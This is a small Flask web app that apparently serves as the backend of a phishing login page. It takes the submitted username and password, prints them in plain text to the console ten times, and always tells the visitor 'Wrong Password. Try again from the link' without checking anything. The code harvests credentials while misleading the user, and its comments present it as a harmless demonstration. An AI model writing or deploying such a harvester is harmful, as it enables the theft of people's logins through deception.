from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']
        
        # Loop 10 times to print username and password
        for i in range(10):
            print("Username: ", username)
            print("Password: ", password)
            print(" ")
        
        # Here you can process the username and password, e.g., authenticate user
        
        # For demonstration purposes, let's just return a success message
        return "Wrong Password. Try again from the link"
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
